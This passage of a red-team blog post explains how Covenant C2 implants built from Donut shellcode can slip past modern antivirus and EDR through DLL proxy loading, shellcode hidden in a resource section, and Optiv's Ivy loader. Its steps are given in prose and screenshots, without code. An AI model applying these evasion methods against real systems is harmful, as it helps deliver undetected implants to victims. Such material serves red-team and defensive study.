data-src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjP8-DYjFB7JOlddi5zpSC6_mffztkMfYz_4GHtqkZaRDKqX-7AG6qp_TqczwRsNCCPRmJ70EvXZDKhquSwoSB-95Pe7q0PJXyaN-FwAEBRSKF9WvPSMapi0-KgG9jf0W3-b1ihxGZQedoLIzwMv4NyTj3wwp_WDFOpl0CHEc9TE40phiDAJ6jgFmcDUA/s320/donut.jpg" width="320" class="lazyload" data-proofer-ignore></a>&nbsp;</p><p style="text-align: left;"><span>&nbsp;&nbsp; &nbsp;</span>Covenant evidently has some well thought out evasion options built into it. It's worth reviewing Donut specifically though for a moment since we'll utilize it below. A key feature is that Donut allows in memory execution of shellcode. Specifically, this shellcode is going to be position independent so that it can be executed from anywhere. How this works at a super high level is that once the grunt is executed, Donut sets up a new application domain meant to run the .NET assembly, shellcode gets loaded into there, and then finally executed. <br /></p><h2 style="text-align: left;">Hiding The Grunts<br /></h2><p style="text-align: left;"><span>&nbsp;&nbsp;&nbsp; </span>Covenant has been around for a long time at this point. There have been quite a few people who have developed different tactics throughout the years that have evaded antivirus. But in 2022 a lot of these don't hold up nearly as well. In 2021/2022, we saw a great advance in EDR's ability to detect malicious actions in files and in memory. There are three techniques for running the Donut shellcode that hold up relatively well despite these advances in detection and below we'll review how they work.</p><h4 style="text-align: left;">DLL Proxy Loading</h4><p><span>&nbsp;&nbsp; &nbsp;</span>This method is the least effective out of the three, but least effective doesn't it won't work and it's up against some stiff competition. What this method does is read in the <span style="font-family: courier;">shellcode.bin</span> file and then use <span style="font-family: courier;">VirtualAlloc </span>to allocate a memory region before copying the shellcode contents into it using <span style="font-family: courier;">memcpy</span>. A simple but effective solution.</p><p style="text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhyTVkJpvX8r27iMjx3DP7p_vsOVfQ8Yq3yEG3JdPrds5z4IdDgYygxpfo5_WRKSzgfqKcO9mn2flLOjJ2kXau2Eto3BtpCaNGEt3P7qnI3vaKwqmbNFHfK36T7ySSdMqE4By4gqOzUJtTGU64KzSA1_KMrsQQqjG9NPpQAbfUAvO6H9OCpQZ4rX70Bbw/s515/Utilizing%20local%20file.png" style="margin-left: 1em; margin-right: 1em;" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 459 204'%3E%3C/svg%3E" border="0" data-original-height="229" data-original-width="515" height="204" data-src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhyTVkJpvX8r27iMjx3DP7p_vsOVfQ8Yq3yEG3JdPrds5z4IdDgYygxpfo5_WRKSzgfqKcO9mn2flLOjJ2kXau2Eto3BtpCaNGEt3P7qnI3vaKwqmbNFHfK36T7ySSdMqE4By4gqOzUJtTGU64KzSA1_KMrsQQqjG9NPpQAbfUAvO6H9OCpQZ4rX70Bbw/w459-h204/Utilizing%20local%20file.png" width="459" class="lazyload" data-proofer-ignore></a>&nbsp;</p><p><span>&nbsp;&nbsp; &nbsp;</span>A lot of EDR/AV had trouble identifying and scanning the shellcode file generated through Donut. But this method has the drawback of needing to drop the DLL and the shellcode seperately, as opposed to just one application or file. <a href="https://redteaming.co.uk/2020/07/12/dll-proxy-loading-your-favorite-c-implant/" rel="nofollow" target="_blank">Redteaming.co.uk has a great right up though on doing this here.</a> If you would like to use this technique, it's advised you use a staged dropper to facilitate retrieving both the needed shellcode and the DLL as well as executing the DLL once both are downloaded.</p><h4 style="text-align: left;">Hiding Shellcode in the .RSRC Section</h4><p style="text-align: left;"><span>&nbsp;&nbsp; &nbsp;</span>Another method for getting the aforementioned shellcode onto the victims system is to generate the shellcode bin and then add it to an applications resource section. This is a common technique that offensive security programmers use to hide their payloads and it's not unique to Covenant. Once added here, we can extract the grunt from the invalid ico file and allocate it to memory and execute! <a href="https://blog.sunggwanchoi.com/covenant-loaders-and-winapi/" rel="nofollow" target="_blank">Find a more detailed write up on this here</a>.&nbsp;</p><p style="text-align: left;"></p><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjgHuyQXCalIURSI3QWipr-kfmKZ7KtOrY4YAy1ygFXDFi6SGk1JohK4u7Z-oRfNtBReqoTy2X4eIM6D8iI5G4RXXTpsdgD8pDbiSsh7M7hyJ6CvV19vqBXpIFY9hDC6rCO2U9lXgo4N0n2pzyTYDvq3qR9EZRqHnVEbWVsi21pMWbBakbEydynE-MgkA/s725/Utilizing%20Rsrc.png" style="margin-left: 1em; margin-right: 1em;" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 523 144'%3E%3C/svg%3E" border="0" data-original-height="199" data-original-width="725" height="144" data-src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjgHuyQXCalIURSI3QWipr-kfmKZ7KtOrY4YAy1ygFXDFi6SGk1JohK4u7Z-oRfNtBReqoTy2X4eIM6D8iI5G4RXXTpsdgD8pDbiSsh7M7hyJ6CvV19vqBXpIFY9hDC6rCO2U9lXgo4N0n2pzyTYDvq3qR9EZRqHnVEbWVsi21pMWbBakbEydynE-MgkA/w523-h144/Utilizing%20Rsrc.png" width="523" class="lazyload" data-proofer-ignore></a></div><p></p><p style="text-align: left;"></p><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi6CuseGlMNKa6jppvBS-1BPD1bl8V3rxn-7zrWgEMGAvS-79S7cvco4NBouEF50jY-LHXx940RFuaaWCMdhVyT9UE4VXA1687hyqgC48pWQX6hC9xeQAcZYCuxhYBsTYZwlSfsC8iJV1_sewFhIH32qd_3M2MhgCDCFBkRw-RORKXj2g0ulxTpUJAcyQ/s725/import%20-%20g%20ico.png" style="margin-left: 1em; margin-right: 1em;" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 519 110'%3E%3C/svg%3E" border="0" data-original-height="154" data-original-width="725" height="110" data-src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi6CuseGlMNKa6jppvBS-1BPD1bl8V3rxn-7zrWgEMGAvS-79S7cvco4NBouEF50jY-LHXx940RFuaaWCMdhVyT9UE4VXA1687hyqgC48pWQX6hC9xeQAcZYCuxhYBsTYZwlSfsC8iJV1_sewFhIH32qd_3M2MhgCDCFBkRw-RORKXj2g0ulxTpUJAcyQ/w519-h110/import%20-%20g%20ico.png" width="519" class="lazyload" data-proofer-ignore></a></div><p></p><p style="text-align: left;"><span>&nbsp;&nbsp; &nbsp;</span>This technique works great for payloads since this is contained within one file. Getting this onto a system can be accomplished either through a staged or stageless dropper since the grunt is only one file and it's a simple executable that a user can start.<span>&nbsp;</span></p><p></p><h4 style="text-align: left;"><span>Evasion With Ivy</span></h4><h2 style="text-align: left;"><span><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiaMMbzv9vgj_OhHACm3QTp4DhXpYikKgxZNHnlNC1Bg45VX_v2OmZl22ior8bk3iKqakvQgY3RtV9B6jx1VFpL3YNlz4SOe3zaeDydWfkDvk2GRKUj4b0dD0Bxr0xdt6yba9V9r_1YO_ECWGH93A47gif4hsRrDwG69CHmyETOjLR_IKA6b8EHT_XjiQ/s300/ivy.png" style="margin-left: 1em; margin-right: 1em;" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 300 300'%3E%3C/svg%3E" border="0" data-original-height="300" data-original-width="300" height="300" data-src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiaMMbzv9vgj_OhHACm3QTp4DhXpYikKgxZNHnlNC1Bg45VX_v2OmZl22ior8bk3iKqakvQgY3RtV9B6jx1VFpL3YNlz4SOe3zaeDydWfkDvk2GRKUj4b0dD0Bxr0xdt6yba9V9r_1YO_ECWGH93A47gif4hsRrDwG69CHmyETOjLR_IKA6b8EHT_XjiQ/s1600/ivy.png" width="300" class="lazyload" data-proofer-ignore></a></div></span></h2><span><span>&nbsp;&nbsp;&nbsp; The third method for evasion, and it's one of my favorites. </span>Ivy is a payload generation tool developed by Optiv. If you haven't heard of it before, you should <a href="https://github.com/optiv/Ivy">read more about it here</a>. Basically though, Ivy takes shellcode, encrypts it, and then and executes it in memory. Ivy accomplishes this by spawning a hidden Excel process and loading the encrypted payload strings into a VBA function. It comes with a number of options for evasion built in like breaking up lines into chunks (so that no one line can be determined to be anything but random characters) and an EDR unhooking mode that builds it's own version of <span style="font-family: courier;">WriteProcessMemory</span>. We can couple Ivy with Covenants ability to generate a Donut payload and find a lot of success in evading modern AV. One small drawback though is that we do need the victim to have Office installed.</span><br /><span><span>&nbsp;&nbsp;&nbsp; </span>Generating a payload is super simple. You have options for either staged or stageless, remote process injection or local execution, and a number of different delivery options. Below is a simple example of generating a stageless payload with the Donut bin that Covenant output. </span><br /><br /></div><div style="text-align: center;"><span><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEghoZAk9jw8OO-QWnwJnjh-oVy2ZcsnQ6l-3fU5Ab5aQ0bF3HwMMWvm72DD73cR_2DzuX_jtOQvgTJw6PDqJHSAokTzXPusZQBYgw1NAita6fm-4TP6WKHGAha3cpyxifwGoEadXjw8XL3TCq-Dk864VCanBPRSc5AkGmbRmniycvIvsPFPz18m58Rv5A/s705/Ivy%20Payload.png" style="margin-left: 1em; margin-right: 1em;" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 476 253'%3E%3C/svg%3E" border="0" data-original-height="375" data-original-width="705" height="253" data-src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEghoZAk9jw8OO-QWnwJnjh-oVy2ZcsnQ6l-3fU5Ab5aQ0bF3HwMMWvm72DD73cR_2DzuX_jtOQvgTJw6PDqJHSAokTzXPusZQBYgw1NAita6fm-4TP6WKHGAha3cpyxifwGoEadXjw8XL3TCq-Dk864VCanBPRSc5AkGmbRmniycvIvsPFPz18m58Rv5A/w476-h253/Ivy%20Payload.png" width="476" class="lazyload" data-proofer-ignore></a></span><br /></div><div><br /><span><span>&nbsp;&nbsp;&nbsp; The generated payloads see a big drop in both attribution and detection rates when compared to the bin that we embedded inside of it.&nbsp;</span></span><br /><span><span></span></span><br /><span><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhjGEa4oFO4RjxBA4K2kzA3jPrtDYWvWFmsIc8qTuthC-GRULkDlAE67mEVTxtQP6gqF0sGtx72FUfmCkPWmObQrh3glW1ZSRk9DII7h2ToOmPaidJqCOI235ZfL4axEMPgLrsSktm0sMAvpr1CAHiObyl-EE65g2nSGhYX7L1cXSHbdkgDyOUV5o_m6w/s2304/Untitled.png" style="margin-left: 1em; margin-right: 1em;" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 631 156'%3E%3C/svg%3E" border="0" data-original-height="568" data-original-width="2304" height="156" data-src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhjGEa4oFO4RjxBA4K2kzA3jPrtDYWvWFmsIc8qTuthC-GRULkDlAE67mEVTxtQP6gqF0sGtx72FUfmCkPWmObQrh3glW1ZSRk9DII7h2ToOmPaidJqCOI235ZfL4axEMPgLrsSktm0sMAvpr1CAHiObyl-EE65g2nSGhYX7L1cXSHbdkgDyOUV5o_m6w/w631-h156/Untitled.png" width="631" class="lazyload" data-proofer-ignore></a></span><br /><br /><br /><span><span>&nbsp;&nbsp; &nbsp;</span>Executing the Ivy payload is equally as simple, the user just needs to double click it. Windows will execute it with the script host and then the grunt will check in.</span></div><div><span>&nbsp;</span><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgj-R4OZz7IZKvXTibpPUVBtropg4_pOoEf2TAJSAGFlgRUKv2BNTpYYqkb9noHm8IrMItB35ExzldGiG-jG_zIQ6TLbtomPkZ3R6xpz_tZMeJUDdxrk-CPf4X9JsIWnqBVQexAUfJmwntCxM2JpCqf2Cw962poR2RDkWDhf-H0kXLhZYAKTuprYp-FTQ/s1360/ivy-grunt-checkin.png" style="margin-left: 1em; margin-right: 1em;" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 620 197'%3E%3C/svg%3E" border="0" data-original-height="433" data-original-width="1360" height="197" data-src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgj-R4OZz7IZKvXTibpPUVBtropg4_pOoEf2TAJSAGFlgRUKv2BNTpYYqkb9noHm8IrMItB35ExzldGiG-jG_zIQ6TLbtomPkZ3R6xpz_tZMeJUDdxrk-CPf4X9JsIWnqBVQexAUfJmwntCxM2JpCqf2Cw962poR2RDkWDhf-H0kXLhZYAKTuprYp-FTQ/w620-h197/ivy-grunt-checkin.png" width="620" class="lazyload" data-proofer-ignore></a></div><p></p><h2 style="text-align: left;"><span>Lessons Learned &nbsp;&nbsp; </span><br /></h2><p style="text-align: left;"><span>&nbsp;&nbsp;&nbsp; </span>It should be evident by now that Covenant can still be used quite effectively in 2022. Covenant comes with a feature rich interface that is really nice to see in a free and open source platform and it is very simple and quick to modify grunts. In this post, we have reviewed three techniques for running grunts that can evade modern EDR/AV. The grunts we developed only utilized the built-in Donut generator, so there is still plenty left to explore with the other launcher options.<br /></p><p style="text-align: left;"><span>&nbsp;&nbsp; &nbsp;</span>This was part one of, hopefully, a multipart series. Next up should be what covenant looks like on the wire and how we can combine user agents and message transformation rules with custom protocols to truly blend in and hide with normal traffic on the wire.<br /></p></div></div><div class="post-tail-wrapper text-muted"><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Covenant%20In%202022%20-%20Culbert%20Report&url=%2Fposts%2Fcovenant-in-2022%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Covenant%20In%202022%20-%20Culbert%20Report&u=%2Fposts%2Fcovenant-in-2022%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=%2Fposts%2Fcovenant-in-2022%2F&text=Covenant%20In%202022%20-%20Culbert%20Report" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Making-Red-Teaming-Safer/">Making Red Teaming Safer</a><li><a href="/posts/Human-Learning-Is-Irreplaceable/">Human Learning Is Irreplaceable</a><li><a href="/posts/Building-A-Detection-Lab-Around-Suricata/">Building A Detection Lab Around Suricata</a><li><a href="/posts/The-evolution-of-evasion/">The Evolution Of Evasion</a><li><a href="/posts/C2-Smackdown-Empire-vs-Mythic/">C2 Smackdown Empire Vs Mythic</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/redteam/">redteam</a> <a class="post-tag" href="/tags/c2/">c2</a> <a class="post-tag" href="/tags/container/">container</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/graphana/">graphana</a> <a class="post-tag" href="/tags/jira/">jira</a> <a class="post-tag" href="/tags/nessus/">nessus</a> <a class="post-tag" href="/tags/non-technical/">non-technical</a> <a class="post-tag" href="/tags/nuages/">nuages</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc"></nav></div><script src="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.js"></script></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4 mt-5"><div id="related-posts" class="mb-2 mb-sm-4"><h3 class="pt-2 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/We-have-lost-the-plot-with-LLMs/"><div class="card-body"> <em class="small" data-ts="1771804800" data-df="ll" > Feb 23, 2026 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>We Have Lost The Plot With Llms</h3><div class="text-muted small"><p> Weve collectively lost the plot In IT and security we say that users are the weakest link, but this is no longer true; now, the weakest link is whatever LLM your company is using to act as both a ...</p></div></div></a></div><div class="card"> <a href="/posts/Language-models-cannot-make-art/"><div class="card-body"> <em class="small" data-ts="1770249600" data-df="ll" > Feb 5, 2026 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Language Models Cannot Make Art</h3><div class="text-muted small"><p> I was in a random coffee shop a few months back and I noticed that they had little coffee table books for sale. One that caught my eye was a Japanese color combination dictionary, originally prin...</p></div></div></a></div><div class="card"> <a href="/posts/Human-Learning-Is-Irreplaceable/"><div class="card-body"> <em class="small" data-ts="1759881600" data-df="ll" > Oct 8, 2025 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Human Learning Is Irreplaceable</h3><div class="text-muted small"><p> What we call AI is really just a cancer attacking our ability to learn and we have very little time remaining to carve it out. A note When I began writing this, it was June in Vermont and one ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/hiding-in-alternate-data-streams/" class="btn btn-outline-primary" prompt="Older"><p>Hiding In Alternate Data Streams</p></a> <a href="/posts/a-beginners-guide-to-webapp-pentesting/" class="btn btn-outline-primary" prompt="Newer"><p>A Beginners Guide To Everything WebApp Pentesting</p></a></div></div></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/redteam/">redteam</a> <a class="post-tag" href="/tags/c2/">c2</a> <a class="post-tag" href="/tags/container/">container</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/graphana/">graphana</a> <a class="post-tag" href="/tags/jira/">jira</a> <a class="post-tag" href="/tags/nessus/">nessus</a> <a class="post-tag" href="/tags/non-technical/">non-technical</a> <a class="post-tag" href="/tags/nuages/">nuages</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><footer><div class="container pl-lg-4 pr-lg-4"><div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3"><div class="footer-left"><p class="mb-0">  2026 <a href="https://twitter.com/">Matt Culbert</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0">Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></div></footer><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lazysizes@5.3.2/lazysizes.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
